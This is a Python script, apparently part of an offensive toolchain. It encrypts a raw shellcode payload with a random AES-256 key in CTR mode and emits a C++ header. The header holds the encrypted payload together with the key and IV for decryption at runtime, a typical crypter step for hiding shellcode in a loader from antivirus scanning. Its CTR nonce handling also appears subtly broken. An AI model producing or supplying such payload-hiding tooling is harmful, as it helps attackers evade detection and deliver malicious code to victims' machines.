import os
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import secrets

# Definiert die Schlüsselgröße für AES (in Bytes). AES-128 = 16, AES-256 = 32
KEY_SIZE = 32 
# Definiert die Blockgröße für AES (immer 16 Bytes)
BLOCK_SIZE = 16

def format_as_cpp_array(name, data):
    """ Formatiert Bytes als C++-Byte-Array. """
    cpp_code = f"unsigned char {name}[] = {{"
    for i, byte in enumerate(data):
        if i % 16 == 0:
            cpp_code += "\n    "
        cpp_code += f"0x{byte:02x}, "
    cpp_code = cpp_code.strip(", ") + "\n};"
    return cpp_code

def main(input_file, output_file):
    """
    Verschlüsselt eine Binärdatei mit einem zufälligen AES-Schlüssel und IV
    und generiert einen C++-Header mit den verschlüsselten Daten, dem Schlüssel und dem IV.
    """
    # 1. Lese die rohe Shellcode-Payload
    try:
        with open(input_file, 'rb') as f:
            payload_data = f.read()
    except FileNotFoundError:
        print(f"Error: Input file '{input_file}' not found.")
        sys.exit(1)

    # 2. Generiere einen kryptographisch sicheren, zufälligen AES-Schlüssel und IV
    key = secrets.token_bytes(KEY_SIZE)
    iv = secrets.token_bytes(BLOCK_SIZE)

    # 3. Erstelle ein AES-Cipher-Objekt im CTR-Modus.
    # CTR benötigt kein Padding.
    cipher = AES.new(key, AES.MODE_CTR, nonce=iv)
    
    # 4. Verschlüssele die Payload
    encrypted_payload = cipher.encrypt(payload_data)

    # 5. Erstelle den C++-Header-Inhalt
    header_content = f"""
#ifndef PAYLOAD_H
#define PAYLOAD_H

#include <vector>

// --- AES Verschlüsselte Payload ---
// Automatisch generiert durch bin_to_header.py

// Key und IV für die Entschlüsselung zur Laufzeit
{format_as_cpp_array('key_data', key)}

{format_as_cpp_array('iv_data', iv)}

// Verschlüsselte Payload
{format_as_cpp_array('payload_data', encrypted_payload)}

#endif // PAYLOAD_H
"""

    # 6. Schreibe den Header in die Ausgabedatei
    with open(output_file, 'w') as f:
        f.write(header_content)

    print(f"Successfully encrypted '{input_file}' and generated '{output_file}'.")
    print(f"  Payload size: {len(payload_data)} bytes")
    print(f"  Encrypted size: {len(encrypted_payload)} bytes")
    print(f"  AES Key: {key.hex()}")
    print(f"  AES IV: {iv.hex()}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python bin_to_header.py <input_binary> <output_header>")
        sys.exit(1)
    
    main(sys.argv[1], sys.argv[2]) 